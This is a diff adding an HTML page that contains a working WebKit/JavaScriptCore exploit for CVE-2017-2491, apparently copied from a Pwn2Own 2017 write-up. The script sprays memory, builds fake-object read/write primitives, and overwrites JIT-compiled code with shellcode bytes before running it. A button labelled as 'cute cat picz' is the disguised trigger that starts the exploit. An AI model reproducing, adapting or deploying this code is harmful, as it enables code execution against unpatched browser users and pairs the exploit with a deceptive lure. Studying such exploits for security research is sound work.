@@ -1,0 +1,190 @@
+<!--
+Sources: 
+https://phoenhex.re/2017-05-04/pwn2own17-cachedcall-uaf
+https://github.com/phoenhex/files/blob/master/exploits/cachedcall-uaf.html
+
+Overview
+The WebKit bug we used at Pwn2Own is CVE-2017-2491 / ZDI-17-231, a use-after-free of a JSString object in JavaScriptCore. By triggering it, we can obtain a dangling pointer to a JSString object in a JavaScript callback. At first, the specific scenario seems very hard to exploit, but we found a rather generic technique to still get a reliable read/write primitive out of it, although it requires a very large (~28 GiB) heap spray. This is possible even on a MacBook with 8 GB of RAM thanks to the page compression mechanism in macOS.
+
+-->
+
+<script>
+
+function make_compiled_function() {
+    function target(x) {
+        return x*5 + x - x*x;
+    }
+    // Call only once so that function gets compiled with low level interpreter
+    // but none of the optimizing JITs
+    target(0);
+    return target;
+}
+
+function pwn() {
+    var haxs = new Array(0x100);
+    for (var i = 0; i < 0x100; ++i)
+        haxs[i] = new Uint8Array(0x100);
+
+    // hax is surrounded by other Uint8Array instances. Thus *(&hax - 8) == 0x100,
+    // which is the butterfly length if hax is later used as a butterfly for a
+    // fake JSArray.
+    var hax = haxs[0x80];
+    var hax2 = haxs[0x81];
+
+    var target_func = make_compiled_function();
+
+    // Small helper to avoid allocations with .set(), so we don't mess up the heap
+    function set(p, i, a,b,c,d,e,f,g,h) {
+        p[i+0]=a; p[i+1]=b; p[i+2]=c; p[i+3]=d; p[i+4]=e; p[i+5]=f; p[i+6]=g; p[i+7]=h;
+    }
+
+    function spray() {
+        var res = new Uint8Array(0x7ffff000);
+        for (var i = 0; i < 0x7ffff000; i += 0x1000) {
+            // Write heap pattern.
+            // We only need a structure pointer every 128 bytes, but also some of
+            // structure fields need to be != 0 and I can't remember which, so we just
+            // write pointers everywhere.
+            for (var j = 0; j < 0x1000; j += 8)
+                set(res, i + j, 0x08, 0, 0, 0x50, 0x01, 0, 0, 0);
+
+            // Write the offset to the beginning of each page so we know later
+            // with which part we overlap.
+            var j = i+1+2*8;
+            set(res, j, j&0xff, (j>>8)&0xff, (j>>16)&0xff, (j>>24)&0xff, 0, 0, 0xff, 0xff);
+        }
+        return res;
+    }
+
+    // Spray ~14 GiB worth of array buffers with our pattern.
+    var x = [
+        spray(), spray(), spray(), spray(),
+        spray(), spray(), spray(), spray(),
+    ];
+
+    // The butterfly of our fake object will point to 0x200000001. This will always
+    // be inside the second sprayed buffer.
+    var buf = x[1];
+
+    // A big array to hold reference to objects we don't want to be freed.
+    var ary = new Array(0x10000000);
+    var cnt = 0;
+
+    // Set up objects we need to trigger the bug.
+    var n = 0x40000;
+    var m = 10;
+    var regex = new RegExp("(ab)".repeat(n), "g");
+    var part = "ab".repeat(n);
+    var s = (part + "|").repeat(m);
+
+    // Set up some views to convert pointers to doubles
+    var convert = new ArrayBuffer(0x20);
+    var cu = new Uint8Array(convert);
+    var cf = new Float64Array(convert);
+
+    // Construct fake JSCell header
+    set(cu, 0,
+        0,0,0,0,  // structure ID
+        8,        // indexing type
+        0,0,0);   // some more stuff we don't care about
+
+    var container = {
+        // Inline object with indebufng type 8 and butterly pointing to hax.
+        // Later we will refer to it as fakearray.
+        jsCellHeader: cf[0],
+        butterfly: hax,
+    };
+
+    while (1) {
+        // Try to trigger bug
+        s.replace(regex, function() {
+            for (var i = 1; i < arguments.length-2; ++i) {
+                if (typeof arguments[i] === 'string') {
+                    // Root all the callback arguments to force GC at some point
+                    ary[cnt++] = arguments[i];
+                    continue;
+                }
+                var a = arguments[i];
+
+                // a.butterfly points to 0x200000001, which is always
+                // inside buf, but we are not sure what the exact
+                // offset is within it so we read a marker value.
+                var offset = a[2];
+
+                // Compute addrof(container) + 16. We write to the fake array, then
+                // read from a sprayed array buffer on the heap.
+                a[2] = container;
+                var addr = 0;
+                for (var j = 7; j >= 0; --j)
+                    addr = addr*0x100 + buf[offset + j];
+
+                // Add 16 to get address of inline object
+                addr += 16;
+
+                // Do the inverse to get fakeobj(addr)
+                for (var j = 0; j < 8; ++j) {
+                    buf[offset + j] = addr & 0xff;
+                    addr /= 0x100;
+                }
+                var fakearray = a[2];
+
+                // Re-write the vector pointer of hax to point to hax2.
+                fakearray[2] = hax2;
+
+                // At this point hax.vector points to hax2, so we can write
+                // the vector pointer of hax2 by writing to hax[16+{0..7}]
+
+                // Leak address of JSFunction
+                a[2] = target_func;
+                addr = 0;
+                for (var j = 7; j >= 0; --j)
+                    addr = addr*0x100 + buf[offset + j];
+
+                // Follow a bunch of pointers to RWX location containing the
+                // function's compiled code
+                addr += 3*8;
+                for (var j = 0; j < 8; ++j) {
+                    hax[16+j] = addr & 0xff;
+                    addr /= 0x100;
+                }
+                addr = 0;
+                for (var j = 7; j >= 0; --j)
+                    addr = addr*0x100 + hax2[j];
+
+                addr += 3*8;
+                for (var j = 0; j < 8; ++j) {
+                    hax[16+j] = addr & 0xff;
+                    addr /= 0x100;
+                }
+                addr = 0;
+                for (var j = 7; j >= 0; --j)
+                    addr = addr*0x100 + hax2[j];
+
+                addr += 4*8;
+                for (var j = 0; j < 8; ++j) {
+                    hax[16+j] = addr & 0xff;
+                    addr /= 0x100;
+                }
+                addr = 0;
+                for (var j = 7; j >= 0; --j)
+                    addr = addr*0x100 + hax2[j];
+
+                // Write shellcode
+                for (var j = 0; j < 8; ++j) {
+                    hax[16+j] = addr & 0xff;
+                    addr /= 0x100;
+                }
+                hax2[0] = 0xcc;
+                hax2[1] = 0xcc;
+                hax2[2] = 0xcc;
+
+                // Pwn.
+                target_func();
+            }
+            return "x";
+        });
+    }
+}
+</script>
+
+<button onclick="pwn()">click here for cute cat picz!</button>
